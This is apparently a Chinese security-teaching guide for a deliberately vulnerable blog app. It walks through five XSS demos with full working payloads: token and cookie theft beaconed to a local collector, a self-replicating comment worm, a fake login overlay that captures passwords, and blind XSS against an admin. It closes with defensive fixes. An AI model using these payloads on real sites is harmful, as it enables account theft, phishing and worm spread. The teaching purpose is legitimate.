# TechBlog - XSS 演示场景详细说明

⚠️ **本文档仅用于授权的安全教学，请勿用于非法用途**

---

## 🎯 演示前准备

### 1. 启动攻击收集器（可选）
用于接收场景 2、3、4、5 的数据上报：

```bash
# 简易 HTTP 服务器接收数据
python3 -m http.server 7777
# 或使用 nc
while true; do nc -l 7777; done
```

### 2. 切换到 VULN 模式
- 点击页面左上角红色 VULN 徽章确认
- 或检查：`fetch('/api/config').then(r=>r.json()).then(console.log)`

### 3. 测试账号
| 用户名 | 密码 | 用途 |
|--------|------|------|
| alice | Admin#2025 | 场景 3（评论蠕虫） |
| attacker | Attacker#2025 | 场景 4（Bio 钓鱼） |
| admin | Admin#2025 | 场景 5（盲 XSS） |

---

## 场景 1：反射型 XSS「Hello, XSS」

### 目标
确认 XSS 漏洞存在，验证代码能执行。

### 攻击步骤
直接访问（已 URL 编码）：
```
http://localhost:5173/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

或手动输入搜索框：
```html
<img src=x onerror=alert(1)>
```

### 预期结果
- **VULN 模式**：弹窗显示 `1`
- **SECURE 模式**：显示转义后的文本 `<img src=x onerror=alert(1)>`

### 技术原理
- 后端 [SearchController](apps/backend/src/main/java/com/techblog/backend/controller/SearchController.java) VULN 模式直接拼接用户输入
- 前端 [Search.vue](apps/frontend/src/pages/Search.vue) 用 `v-html` 渲染后端返回的 message

### 防御机制
- **后端**：`HtmlUtils.htmlEscape()` 转义特殊字符
- **前端**：避免 `v-html`，改用文本插值 `{{ }}`

---

## 场景 2：静默画像收集

### 目标
无感窃取 JWT 凭证并上报到攻击者服务器（不弹窗）。

### 攻击步骤
1. 准备 Payload（复制整段）：
```html
<img src=x onerror="
(function(){
  var t = localStorage.getItem('accessToken');
  var info = {hasToken: !!t};
  function log(){ new Image().src='http://127.0.0.1:7777/x?d='+btoa(JSON.stringify({where:'search',info:info})); }
  if(t){
    fetch('/api/auth/me',{headers:{Authorization:'Bearer '+t}})
      .then(r=>r.ok?r.json():null).then(j=>{info.profile=!!j; log();}).catch(log);
  }else{ log(); }
})();
">
```

2. 对 Payload 进行 URL 编码（浏览器 Console）：
```javascript
encodeURIComponent(`<img src=x onerror="...刚才的代码...">`)
```

3. 拼接 URL 并访问：
```
http://localhost:5173/search?q=<编码后的结果>
```

### 预期结果
- **VULN 模式**：
  - 页面不弹窗
  - 收集器终端打印类似：
    ```json
    {"where":"search","info":{"hasToken":true,"profile":true}}
    ```

- **SECURE 模式**：
  - Payload 被转义，不执行
  - 收集器无数据

### 技术细节
- 读取 `localStorage.getItem('accessToken')`
- 尝试调用 `/api/auth/me` 验证 Token 有效性
- 使用 `new Image().src` 绕过 CORS 发送数据
- `btoa()` 进行 Base64 编码

---

## 场景 3：评论蠕虫 ⭐

### 目标
展示存储型 XSS 的自传播能力，模拟蠕虫式扩散。

### 攻击步骤
1. 使用 **alice** 账号登录

2. 访问文章详情页（如 `/article/1`）

3. 在评论框粘贴以下 Payload：
```html
<img src=x onerror="
(async()=>{
  const cur = (location.pathname.match(/\/article\/(\d+)/)||[])[1];
  if(!cur) return;
  const mark = 'worm:' + cur;
  if(localStorage.getItem(mark)) return;
  localStorage.setItem(mark,'1');
  
  const seen = new Set();
  document.querySelectorAll('a[href^=\"/article/\"]').forEach(a=>{
    const m = (a.getAttribute('href').match(/\/article\/(\d+)/)||[])[1];
    if(m && m!==cur) seen.add(m);
  });
  while(seen.size < 3) seen.add(String(Number(cur) + seen.size + 1));
  const targets = [...seen].slice(0,3);
  
  const payload = this.outerHTML;
  
  for(const id of targets){
    try{
      await fetch(`/api/articles/${id}/comments`, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({content: payload})
      });
    }catch(e){}
  }
  
  new Image().src='http://127.0.0.1:7777/x?d='+btoa(JSON.stringify({where:'worm', from:cur, to:targets}));
})();
">
```

4. 点击「发表评论」

5. 访问其他文章（如 `/article/2`、`/article/3`）观察传播

### 预期结果
- **VULN 模式**：
  - 评论成功发表
  - 蠕虫自动复制到 3 篇文章的评论区
  - 收集器记录传播路径：
    ```json
    {"where":"worm", "from":"1", "to":["2","3","4"]}
    ```
  - `localStorage` 中有 `worm:1`、`worm:2` 等标记

- **SECURE 模式**：
  - 评论存储时被转义：`&lt;img src=x...&gt;`
  - 前端渲染为纯文本
  - 不执行，不传播

### 技术亮点
- **防重复**：`localStorage.setItem('worm:' + 文章ID, '1')`
- **目标选择**：优先选页面上的文章链接，兜底用 ID+1/+2/+3
- **可控传播**：最多传播到 3 个目标
- **自我复制**：`this.outerHTML` 复制自身

### 清理方法
- 删除带毒评论
- 清空 localStorage：`localStorage.clear()`
- 或切换到 SECURE 模式

---

## 场景 4：Bio 伪造登录页

### 目标
通过 CSS 伪造全屏登录界面，诱骗用户输入账号密码。

### 攻击步骤
1. 使用 **attacker** 账号登录

2. 访问个人主页 `/profile/attacker`

3. 点击「编辑简介」按钮

4. 粘贴以下 Payload（已精简至 1000 字符内）：
```html
<style>html,body{overflow:hidden!important;margin:0}#f{position:fixed;inset:0;background:#0B1220;z-index:9999;display:grid;place-items:center}form{background:#121826;padding:40px;border-radius:16px;width:min(90vw,420px);border:1px solid #1e293b}h2{color:#22D3EE;margin:0 0 8px;text-align:center;font-size:28px}.s{color:#94A3B8;margin:0 0 32px;text-align:center;font-size:14px}.d{margin-bottom:20px}label{color:#94A3B8;margin-bottom:8px;display:block;font-size:13px}input{width:100%;padding:12px;background:#0b1220;border:1px solid #334155;color:#e2e8f0;border-radius:8px;font-size:14px;box-sizing:border-box}input:focus{border-color:#22d3ee;outline:none}button{width:100%;padding:14px;background:linear-gradient(180deg,#60a5fa,#3b82f6);color:#0b1220;border:none;border-radius:8px;font-weight:700;font-size:15px;cursor:pointer;margin-top:8px}.t{margin-top:20px;text-align:center;font-size:13px;color:#94a3b8}</style><div id="f"><form onsubmit="event.preventDefault();new Image().src='http://127.0.0.1:7777/x?d='+btoa(JSON.stringify({where:'bio',u:this.u.value,p:this.p.value}));alert('登录失败');this.u.value='';this.p.value='';"><h2>⚡ TechBlog</h2><div class="s">会话已过期，请重新登录</div><div class="d"><label>用户名</label><input name="u" placeholder="请输入用户名" required></div><div class="d"><label>密码</label><input name="p" type="password" placeholder="请输入密码" required></div><button>登录</button><div class="t">还没有账号？<a href="#" style="color:#22d3ee">立即注册</a></div></form></div>
```

5. 点击「保存」

6. 退出登录，以其他身份（如 alice）访问 `/profile/attacker`

### 预期结果
- **VULN 模式**：
  - 全屏伪造登录页覆盖
  - 包含项目 Logo 和配色
  - "会话已过期"提示增强可信度
  - 用户输入后弹窗"登录失败"
  - 收集器记录：
    ```json
    {"where":"bio", "u":"alice", "p":"Admin#2025"}
    ```

- **SECURE 模式**：
  - DOMPurify 过滤掉 `<style>` 和 `<script>`
  - 只显示纯文本

### 技术细节
- **全屏覆盖**：`position:fixed; inset:0; z-index:9999`
- **视觉仿真**：使用项目配色 `#22D3EE`、`#121826`
- **表单内联**：`onsubmit` 直接处理提交
- **持续诱骗**：提交后清空表单而不关闭

---

## 场景 5：盲 XSS 窃取管理员身份

### 目标
利用管理员查看反馈时的会话权限窃取凭证（管理员无感知）。

### 攻击步骤
1. 访问 `/feedback` 页面（无需登录）

2. 填写反馈表单：
   - **邮箱**：`evil@hacker.com`
   - **反馈内容**：
```html
<img src=x onerror="
fetch('/api/auth/me').then(r=>r.json()).then(j=>{
  new Image().src='http://127.0.0.1:7777/x?d='+btoa(JSON.stringify({
    where:'blind-admin',
    username: j.username,
    role: j.role,
    cookie: document.cookie
  }));
});
">
```

3. 点击「提交反馈」

4. 使用 **admin** 账号登录

5. 访问 `/admin/feedbacks`

6. 点击刚才提交的反馈的「查看」按钮

### 预期结果
- **VULN 模式**：
  - 管理员无感知（不弹窗）
  - 收集器记录管理员信息：
    ```json
    {
      "where":"blind-admin",
      "username":"admin",
      "role":"ADMIN",
      "cookie":"access=eyJhbGc..."
    }
    ```

- **SECURE 模式**：
  - 反馈存储时被转义：`&lt;img src=x...&gt;`
  - 前端渲染为纯文本
  - 不执行，收集器无数据

### 技术细节
- **盲打**：攻击者不知道何时触发
- **高价值目标**：管理员权限
- **隐蔽性强**：无视觉反馈
- **会话劫持**：获取 Cookie 可伪造管理员身份

### 防御要点
- **后端**：存储前进行 HTML 转义
- **前端**：使用文本渲染而非 `v-html`

---

## 🛡️ 防御措施总结

### 后端防御
```java
// 1. HTML 转义（场景 1/2/3/5）
if (xssProperties.isSecure()) {
    content = HtmlUtils.htmlEscape(userInput);
}

// 2. CSP 响应头（SECURE 模式）
.contentSecurityPolicy(csp -> csp.policyDirectives(
    "default-src 'self'; " +
    "script-src 'self'; " +
    "style-src 'self' 'unsafe-inline';"
))
```

### 前端防御
```javascript
// 1. 文本渲染（场景 1/2/3/5）
<div>{{ userInput }}</div>  // ✅ 安全

// 2. DOMPurify 白名单过滤（场景 4）
import DOMPurify from 'dompurify';
const safe = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: { 'a': ['href', 'title'] }
});

// 3. 避免不安全的 v-html
<div v-html="userInput"></div>  // ❌ 危险（仅场景 4 VULN 模式使用）
```

### JWT 存储
```javascript
// ❌ VULN：localStorage（可被 JS 读取）
localStorage.setItem('accessToken', token);

// ✅ SECURE：HttpOnly Cookie（JS 无法访问）
Cookie cookie = new Cookie("access", token);
cookie.setHttpOnly(true);
cookie.setSecure(true);
cookie.setSameSite("Strict");
```

---

## 📊 场景对比

| 场景 | 类型 | 隐蔽性 | 影响范围 | 触发条件 |
|------|------|--------|----------|----------|
| 1 | 反射型 | 低 | 点击链接的用户 | 主动点击 |
| 2 | 反射型 | 中 | 点击链接的用户 | 主动点击 |
| 3 | 存储型 | 中 | 所有访问相关文章的用户 | 访问文章 |
| 4 | 存储型 | 高 | 所有访问特定主页的用户 | 访问主页 |
| 5 | 盲 XSS | 极高 | 管理员（高价值目标） | 管理员查看 |

---

## 🎓 教学建议

### 演示流程
1. **第一阶段**：VULN 模式依次演示场景 1→5，讲解危害
2. **第二阶段**：切换 SECURE 模式重复操作，观察防御效果
3. **第三阶段**：代码 Review，讲解防御机制实现

### 重点强调
- **Cookie 安全属性**：HttpOnly + Secure + SameSite
- **输出编码**：后端 HTML 转义 + 前端文本渲染
- **分场景防御**：场景 1/2/3/5 纯文本，场景 4 DOMPurify 过滤
- **CSP 策略**：限制脚本来源，防止内联脚本
- **最小权限原则**：普通用户无法访问管理后台

---

## 🔧 故障排查

### 问题：XSS 不生效
- 确认当前为 VULN 模式（红色徽章）
- 清空浏览器缓存重试
- 检查 Console 是否有错误

### 问题：收集器无数据
- 确认收集器已启动在 7777 端口
- 检查浏览器 Network 是否有跨域错误
- 尝试换成 `127.0.0.1` 或 `localhost`

### 问题：Bio 保存失败
- 检查 Payload 长度是否超过 3000 字符
- 查看后端日志是否有验证错误

---

## ⚠️ 免责声明

本项目仅用于授权的安全研究与教学。使用者须遵守法律法规，产生的后果自负。

**使用前请确认**：
- ✅ 已获得授权
- ✅ 仅在隔离环境中运行
- ✅ 不连接公网
- ✅ 理解其中的安全风险
